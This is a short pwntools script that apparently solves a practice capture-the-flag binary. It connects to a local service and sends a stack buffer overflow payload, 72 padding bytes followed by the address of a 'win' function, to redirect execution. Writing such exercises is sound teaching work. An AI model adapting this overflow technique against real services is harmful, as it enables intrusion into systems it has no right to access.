
from pwn import *
elf = ELF('build/stage05_demo_with_hint', checksec=False)
offset = 72
io = remote('127.0.0.1', 7105, timeout=5)
io.send(b'A'*offset + p64(elf.symbols['win']))
print(io.recvall(timeout=2).decode())
